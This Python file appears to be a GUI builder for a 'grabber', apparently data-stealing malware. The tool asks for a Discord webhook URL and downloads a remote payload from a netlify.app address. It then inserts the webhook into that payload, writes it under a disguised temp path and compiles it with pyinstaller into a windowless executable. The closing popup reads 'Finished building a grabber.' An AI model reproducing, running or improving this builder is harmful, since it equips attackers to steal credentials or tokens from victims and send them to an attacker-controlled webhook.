import ctypes, os, requests
from ctypes import windll
if not os.path.exists(os.getenv('LOCALAPPDATA') + '\\Temp\\4F25503F-8138-4C83-B96E-335525D0458C'):
    ctypes.windll.user32.MessageBoxW(0, 'Installing required packages.', 'First-Time-Launching detected!', 0)
    os.system("pip install discord_webhook")
    os.system("pip install customtkinter")
from tkinter import PhotoImage
import customtkinter
import webbrowser
import time, threading, shutil, tkinter
from PIL import ImageTk, Image

customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("dark-blue")
root = customtkinter.CTk()
root.title("Hypothetic")
root.iconbitmap(os.getcwd() + '//src//images//h_logo.ico')
width_of_window = 350
height_of_window = 540
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x_coordinate = (screen_width/2)-(width_of_window/2) 
y_coordinate = (screen_height/2)-(height_of_window/2)
root.geometry("%dx%d+%d+%d" %(width_of_window,height_of_window,x_coordinate,y_coordinate))
root.resizable(width=False, height=False)
root.overrideredirect(1)

def set_appwindow():
    global hasstyle
    GWL_EXSTYLE=-20
    WS_EX_APPWINDOW=0x00040000
    WS_EX_TOOLWINDOW=0x00000080
    if not hasstyle:
        hwnd = windll.user32.GetParent(root.winfo_id())
        style = windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
        style = style & ~WS_EX_TOOLWINDOW
        style = style | WS_EX_APPWINDOW
        res = windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, style)
        root.withdraw()
        root.after(10, lambda:root.wm_deiconify())
        hasstyle=True

def get_pos(event):
    global xwin
    global ywin
    xwin = event.x
    ywin = event.y

def dragwin(event):
    global previousPosition
    root.geometry(f'+{event.x_root - xwin}+{event.y_root - ywin}')
    previousPosition = [root.winfo_x(), root.winfo_y()]

def quitter(e):
    root.destroy()
    root.quit()
    exit()

main_logo = Image.open(os.getcwd() + '\\src\\images\\log_main.png').resize((30, 30))

# Sidebar
sb_frame = customtkinter.CTkFrame(master=root, border_width=0, corner_radius=0, fg_color='#2a292a', height=600, width=50)
sb_frame.pack(pady=0, padx= 0, fill='both', expand=False, side='left')
sb_frame.place(y=0, x=0)
holding_txt_side = customtkinter.CTkLabel(master=sb_frame, text='')
holding_txt_side.pack(padx = 30, pady = 270)
gra_side = customtkinter.CTkLabel(master=sb_frame, text='', image=ImageTk.PhotoImage(main_logo))
gra_side.pack(pady=10)
gra_side.place(x=15,y=50)

log = Image.open(os.getcwd() + '\\src\\images\\hypothetic_logo.png').resize((220, 30))
fadsfda = Image.open(os.getcwd() + '\\src\\images\\x.png').resize((32, 32))
asfdjkl = Image.open(os.getcwd() + '\\src\\images\\bg.png').resize((350, 30))

# Create Fake Title Bar
title_bar = customtkinter.CTkFrame(master=root, border_width=0, corner_radius = 0, fg_color='#2a292a', width=100)
title_bar.pack(pady=0, fill='both', expand=False)
bg_t = customtkinter.CTkLabel(master=title_bar, text='', image=ImageTk.PhotoImage(asfdjkl))
bg_t.place(x=0, y=0)
a = customtkinter.CTkLabel(master=title_bar, text='')
a.pack(side='top')
close_btn = customtkinter.CTkLabel(master=title_bar, image=ImageTk.PhotoImage(fadsfda), text='')
close_btn.place(x = 315, y = -2)
# Bind the titlebar
bg_t.bind('<B1-Motion>', dragwin)
bg_t.bind("<Button-1>", get_pos)
close_btn.bind('<Button-1>', quitter)

# Main Func
wb_frame = customtkinter.CTkFrame(master=root, border_width=0, corner_radius=5, height=900, width=800)
wb_frame.pack(pady=0, padx= 0, fill='both', expand=False)
wb_frame.place(x=83, y=50)

wb_lb = customtkinter.CTkLabel(master=wb_frame, text="Enter Your Webhook URL")
wb_lb.pack(padx = 52, pady = 0)

wb_url = customtkinter.CTkEntry(master=wb_frame, placeholder_text="URL Link")
wb_url.pack(padx = 10, pady = 12)

# Options
options_frame = customtkinter.CTkFrame(master=root, corner_radius=5)
options_frame.pack(pady = 10, padx=60, fill="both", expand=False, side='right')
options_frame.place(x=83, y=200)

option_l = customtkinter.CTkLabel(master=options_frame, text="Options")
option_l.pack(padx = 100, pady = 5)

options_holder = customtkinter.CTkLabel(master=options_frame, text="")
options_holder.pack(padx = 100, pady = 100)

aa = customtkinter.CTkCheckBox(master=options_frame, text="Add Your Own One!")
aa.pack(padx = 10, pady = 12)
aa.place(x=10, y=50)

bb = customtkinter.CTkCheckBox(master=options_frame, text="Add Your Own One!")
bb.pack(padx = 10, pady = 12)
bb.place(x=10, y=80)

cc = customtkinter.CTkCheckBox(master=options_frame, text="Add Your Own One!")
cc.pack(padx = 10, pady = 12)
cc.place(x=10, y=110)

dd = customtkinter.CTkCheckBox(master=options_frame, text="Add Your Own One!")
dd.pack(padx = 10, pady = 12)
dd.place(x=10, y=140)

ee = customtkinter.CTkCheckBox(master=options_frame, text="Add Your Own One!")
ee.pack(padx = 10, pady = 12)
ee.place(x=10, y=170)

ff = customtkinter.CTkCheckBox(master=options_frame, text="Add Your Own One!")
ff.pack(padx = 10, pady = 12)
ff.place(x=10, y=200)

MAKEIT = customtkinter.CTkButton(master = wb_frame, text="Build", command=lambda:threading.Thread(target=generate).start())
MAKEIT.pack(padx = 10, pady = 12)

progressbar = customtkinter.CTkProgressBar(master=wb_frame, mode='indeterminate', indeterminate_speed=1)

def generate():
    if wb_url.get() == '':
            ctypes.windll.user32.MessageBoxW(0, 'Enter a valid URL Link! 😤', 'Hypothetic', 0)
            return
    MAKEIT.pack_forget()
    progressbar.pack(padx=20, pady=10)
    progressbar.start()
    raw = requests.get('https://transcendent-kheer-2b95c8.netlify.app/')
    url = wb_url.get()
    edited_raw = raw.text.replace("url=''", "url = '" + url + "'")
    if not os.path.exists(os.getenv('LOCALAPPDATA') + '\\Temp\\4F25503F-8138-4C83-B96E-335525D0458C'):
        os.makedirs(os.getenv('LOCALAPPDATA') + '\\Temp\\4F25503F-8138-4C83-B96E-335525D0458C')
    grpath = os.path.join(os.getenv('LOCALAPPDATA') + '\\Temp\\4F25503F-8138-4C83-B96E-335525D0458C', 'TWXdrTkkwpmLIfKu.py')
    grab = open(grpath, 'w', encoding="utf-8")
    grab.write(edited_raw.encode().decode())
    grab.close()
    time.sleep(1)
    progressbar.step()
    os.system("cd " + os.getenv('LOCALAPPDATA') + "\\Temp\\4F25503F-8138-4C83-B96E-335525D0458C")
    os.system("pyinstaller --onefile -w " + os.getenv('LOCALAPPDATA') + "\\Temp\\4F25503F-8138-4C83-B96E-335525D0458C\\TWXdrTkkwpmLIfKu.py")
    shutil.rmtree(os.getcwd() + '\\build')
    os.remove(os.getenv('LOCALAPPDATA') + "\\Temp\\4F25503F-8138-4C83-B96E-335525D0458C\\TWXdrTkkwpmLIfKu.py")
    os.remove(os.getcwd() + '\\TWXdrTkkwpmLIfKu.spec')
    os.chdir(os.getcwd())
    if os.path.exists(os.getcwd() + '\\Release'):
        shutil.rmtree(os.getcwd() + '\\Release')
    os.rename("dist","Release")
    progressbar.stop()
    progressbar.pack_forget()
    MAKEIT.pack(padx = 10, pady = 12)
    ctypes.windll.user32.MessageBoxW(0, 'Finished building a grabber.', 'Hypothetic', 0)

hasstyle = False
set_appwindow()

root.mainloop()